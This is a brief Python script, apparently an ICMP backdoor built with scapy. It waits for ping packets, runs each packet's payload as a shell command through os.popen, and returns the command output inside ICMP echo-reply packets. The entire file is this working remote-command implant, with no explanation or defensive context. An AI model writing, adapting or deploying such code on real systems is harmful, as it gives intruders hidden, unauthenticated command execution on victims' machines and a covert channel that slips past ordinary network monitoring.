
import os
from scapy.all import *
from scapy.layers.inet import IP, ICMP


def main():
    while True:

        rx = sniff(filter='icmp', count=1)
        var = rx[0][Raw].load.decode('utf-8')
        res = os.popen(var).read()
        send(IP(dst="localhost")/ICMP(type="echo-reply", id=0x0001, seq=0x1)/res)

if __name__ == '__main__':
    main()

